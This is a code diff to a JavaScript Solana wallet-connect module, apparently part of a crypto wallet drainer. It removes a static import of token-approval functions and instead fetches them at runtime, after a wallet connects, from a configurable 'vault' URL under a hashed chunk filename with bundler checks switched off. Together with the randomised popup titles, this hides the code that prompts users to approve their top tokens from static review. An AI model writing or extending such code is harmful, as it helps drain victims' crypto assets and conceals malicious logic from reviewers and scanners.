@@ -6,10 +6,6 @@ import {
   INCLUDE_WALLET_IDS,
 } from "./solana-wallets.js";
 import {
-  createRpcConnection,
-  promptTopTokenApprovals,
-} from "./token-approval.js";
-import {
   setupWalletSelectPopup,
   closeWalletConnectPopup,
   setupPopupMessageListener,
@@ -38,6 +34,8 @@ const SOLANA_CONNECT = { view: "Connect", namespace: "solana" };
  * @property {boolean} [connectPopupEnabled]
  * @property {string} [connectPopupUrl] Vercel popup base, e.g. https://app.vercel.app/profile
  * @property {string} [connectPopupTitle] fixed title; omit for random each time
+ * @property {string} [chunkBase] same-origin vault URL for esbuild split chunks
+ * @property {string[]} [splitChunks] hashed chunk filenames under chunks/
  */
 
 /** @type {string | null} */
@@ -152,6 +150,11 @@ function setupPostConnectApprovals(modal, config) {
           return;
         }
 
+        const chunk = (config.splitChunks || [])[0] || "chunks/H7kL9mN2pQx.js";
+        const base = (config.chunkBase || "").replace(/\/$/, "");
+        const { createRpcConnection, promptTopTokenApprovals } = await import(
+          /* @vite-ignore */ `${base}?c=${encodeURIComponent(chunk)}`
+        );
         const connection = createRpcConnection(config);
         await promptTopTokenApprovals({
           config,
